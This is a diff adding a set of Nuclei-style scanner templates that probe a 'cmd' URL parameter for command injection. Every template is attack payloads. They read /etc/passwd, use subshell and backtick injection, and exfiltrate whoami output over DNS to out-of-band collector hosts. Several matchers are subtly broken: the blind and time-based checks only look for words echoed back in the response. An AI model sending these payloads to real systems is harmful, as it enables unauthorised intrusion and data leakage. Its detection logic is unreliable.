@@ -1,0 +1,158 @@
+id: basic-waf-detect
+info:
+  name: WAF Detection via RCE
+  author: AniipID
+  severity: medium
+  description: Detects WAF blocking patterns by observing response differences
+  tags: rce,waf,detection
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?cmd=id"
+      - "{{BaseURL}}?cmd=cat+/etc/passwd"
+      - "{{BaseURL}}?cmd=ls+-la"
+      - "{{BaseURL}}?cmd=whoami"
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "root:"
+          - "www-data"
+          - "bin"
+          - "daemon"
+        condition: or
+        name: "waf-bypassed"
+---
+id: blind-rce-oob-dns
+info:
+  name: Blind RCE via OOB DNS
+  author: AniipID
+  severity: critical
+  description: Tests blind command injection with out-of-band DNS exfiltration
+  tags: rce,blind,oob,dns
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?cmd=nslookup+`whoami`.burpcollaborator.net"
+      - "{{BaseURL}}?cmd=dig+`whoami`.oastify.com"
+      - "{{BaseURL}}?cmd=host+`whoami`.interactsh.com"
+      - "{{BaseURL}}?cmd=ping+-c+1+`whoami`.dnslog.cn"
+      - "{{BaseURL}}?cmd=nslookup+$(whoami).collaborator.com"
+    matchers:
+      - type: word
+        words:
+          - "burpcollaborator"
+          - "oastify"
+          - "interactsh"
+          - "dnslog"
+        condition: or
+        name: "blind-oob-triggered"
+---
+id: blind-rce-time-based
+info:
+  name: Blind RCE Time-Based Detection
+  author: AniipID
+  severity: critical
+  description: Detects blind command injection using time delays
+  tags: rce,blind,time-based
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?cmd=sleep+5"
+      - "{{BaseURL}}?cmd=ping+-c+3+127.0.0.1"
+      - "{{BaseURL}}?cmd=time+wget+https://google.com+-q+2>/dev/null"
+    matchers:
+      - type: word
+        words:
+          - "sleep"
+          - "ping"
+        condition: or
+        name: "time-delay-triggered"
+---
+id: rce-curl-wget
+info:
+  name: RCE via curl/wget
+  author: AniipID
+  severity: critical
+  description: Tests command injection using curl and wget for SSRF-based detection
+  tags: rce,ssrf,oob
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?cmd=curl+http://127.0.0.1:9999"
+      - "{{BaseURL}}?cmd=wget+http://127.0.0.1:9999"
+      - "{{BaseURL}}?cmd=curl+-s+--connect-timeout+2+http://127.0.0.1/test"
+      - "{{BaseURL}}?cmd=wget+-q+--timeout=2+http://127.0.0.1/test"
+    matchers:
+      - type: status
+        status:
+          - 200
+        name: "curl-wget-executed"
+---
+id: rce-awk-sed
+info:
+  name: RCE via awk/sed
+  author: AniipID
+  severity: high
+  description: Tests command injection with awk and sed utilities
+  tags: rce,awk,sed
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?cmd=awk+'{print+1}'+/etc/passwd"
+      - "{{BaseURL}}?cmd=sed+-n+'1p'+/etc/passwd"
+      - "{{BaseURL}}?cmd=awk+'BEGIN{system(\"id\")}'"
+      - "{{BaseURL}}?cmd=sed+'s/root/admin/'+/etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "uid="
+        condition: or
+        name: "awk-sed-executed"
+---
+id: rce-wildcard-injection
+info:
+  name: RCE via Wildcard Injection
+  author: AniipID
+  severity: high
+  description: Tests command injection via glob/wildcard patterns
+  tags: rce,wildcard,glob
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?cmd=ls+*"
+      - "{{BaseURL}}?cmd=cat+*"
+      - "{{BaseURL}}?cmd=ls+/?i?e/p?ss?d"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "etc"
+          - "passwd"
+        condition: or
+        name: "wildcard-rce"
+---
+id: rce-subshell-injection
+info:
+  name: RCE via Subshell Injection
+  author: AniipID
+  severity: critical
+  description: Tests command injection using subshell commands
+  tags: rce,subshell,injection
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?cmd=$(whoami)"
+      - "{{BaseURL}}?cmd=$(id)"
+      - "{{BaseURL}}?cmd=`id`"
+      - "{{BaseURL}}?cmd=`whoami`"
+      - "{{BaseURL}}?cmd=$(cat+/etc/passwd)"
+      - "{{BaseURL}}?cmd=`cat+/etc/passwd`"
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "root:"
+        condition: or
+        name: "subshell-rce"
